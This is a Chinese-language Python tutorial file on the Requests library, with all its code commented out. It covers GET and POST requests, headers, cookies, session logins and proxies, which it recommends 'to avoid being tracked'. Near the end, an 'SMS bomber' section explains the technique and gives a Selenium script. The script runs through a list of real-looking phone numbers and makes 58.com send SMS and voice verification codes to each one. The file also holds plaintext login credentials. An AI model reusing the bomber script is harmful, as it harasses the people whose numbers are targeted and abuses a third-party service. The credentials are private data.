"""
课题：爬虫请求库Requests入门(urllib了解)
"""

"""1.Requests安装"""
# pip install requests

"""2.Requests作用"""
# 发送网络请求

"""3.Requests发送get请求"""
# import requests
# # 1.准备起始的url地址
# start_url = 'https://v.kuaishou.com/7t0pay'
# # 2.发送请求，获取响应
# headers = {
#     # 浏览器的标识，让我们的程序，模拟浏览器发送请求
#     'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Mobile Safari/537.36'
# }
#
# response = requests.get(start_url, headers=headers)
# 3.解析响应，数据提取
"""4.Requests常用属性"""
"""获取响应源码:字符串类型"""
# print(response.text, type(response.text))
"""response.content字节类型,需要decode()编码"""
# 1字节=多少位？
# 8位
# print(response.content, type(response.content))
# # 4.保存数据
# 404, 302
"""获取状态码"""
# print(response.status_code)
# if response.status_code == 200:
#     print('数据提取')
# else:
#     print('重新发送请求')
"""不常用"""
# 响应对应的请求头
# print(response.request.headers)
# 响应头
# print(response.headers)
# # 请求url地址
# print(response.request.url)

"""获取响应的url地址"""
# print(response.status_code)
# print(response.url)
# 通过此方法获取到重定向之后的url地址
# 应用场景：
# 302重定向

"""获取cookie"""
# cookie：是存储用户登录信息，保持登录的作用
# post
# print(response.cookies)
# CookieJar

"""获取json数据"""
# print(response.json())
# 这个url返回的响应必须是json数据才能够使用response.json()方法

"""6.Requests发送带headers的请求"""
# import requests
#
# # 1.准备起始的url地址
# for page in range(10): # page：页码（翻页操作）
#     start_url = f'https://movie.douban.com/top250?start={page * 25}&filter=' # filter：过滤
#     print(start_url)
#     # 2.发送请求，获取响应
#     headers = {
#         'Referer': 'https://movie.douban.com/top250?start=0&filter=', # referer：headers的一部分，表示请求来源，为了避免盗链
#         'Host': 'movie.douban.com',
#         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
#     }
#     response = requests.get(start_url, headers=headers)
#     if response.status_code == 200:
#         print(response.content.decode())
#         print()
#         print()
#         print()
"""7.Requests发送post请求"""
# 应用场景：
# get请求，传递参数是以明文的状态下进行传输
# # 不安全
# import requests
#
# # 会话保持的操作，让程序记录登录状态
# session = requests.session()
#
# # 1.准备起始的url地址(寻找登录的url地址)
# start_url = 'https://accounts.douban.com/j/mobile/login/basic'
# headers = {
#     'referer': 'https://www.douban.com/',
#     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
# }
# data = {
#     'ck': '',
#     'remember': 'true',
#     'name': '16607440667',
#     'password': 'aef123456'
# }
# session.post(start_url, data=data, headers=headers)
# next_url = 'https://www.douban.com/'
# response_1 = session.get(next_url, headers=headers)
# print(response_1.content.decode())


import requests

# # 1.准被起始的url地址
# start_url = 'http://www.renren.com/ajax/ShowCaptcha'
#
# data = {
#     'email': 's403411124@163.com',
#     '_rtk': 'aef123456'
# }

"""8.使用代理"""
"""防止被追踪"""
# import requests
# proxy = {
#     '49.86.178.113': '9999'
# }
# start_url = 'https://www.baidu.com'
# response = requests.get(start_url, proxies=proxy)
# print(response.content.decode())


"""1.短信轰炸机"""
"""
原理：
1.通过第三方平台付费实现短信轰炸的效果—云通讯

2.整合各个平台短信接口
  不大：现在的智能机-骚扰短信拦截(骚扰电话拦截)

  语音的形式进行通知(手机不会拦截)

3.电话轰炸
"""
"""
贷款金融平台:不需要滑块验证就可以发送验证码
代码原理：
"""

# from selenium import webdriver
# import time
# list_1 = ['18597941574', '17736644372', '15185552928', '17551049152', '13193709088']
# for i in list_1:
#     # phone_number = input('请输入手机号码：')
#     driver = webdriver.Chrome()
#     start_url = 'https://passport.58.com/reg/?path=https%3A%2F%2Fcs.58.com%2F%3Futm_source%3Dmarket%26spm%3Du-2d2yxv86y3v43nkddh1.BDPCPZ_BT&source=58-homepage-pc&utm_source=market&spm=u-2d2yxv86y3v43nkddh1.BDPCPZ_BT&PGTID=0d100000-0019-e6d9-2aba-e991bc5d85f4&ClickID=2'
#
#     driver.get(start_url)
#     driver.implicitly_wait(5)
#     driver.find_element_by_class_name('pop_input').send_keys(i)
#     time.sleep(0.5)
#     driver.find_element_by_id('mask_body_item_getcode').click()
#     time.sleep(20)
#     driver.find_element_by_id('mask_body_item_getvoicecode').click()
#     time.sleep(0.5)
#     driver.close()
#     time.sleep(2)

"""response属性"""

# 获取状态码：
# resposne.status_code
# status_code没有括号
# response.text没有括号
# response.cookies
# response.headers
# response.request.headers
# response.url
# import requests
# start_url = 'https://www.baidu.com'
# response = requests.get(start_url)
# print(response.content.decode())











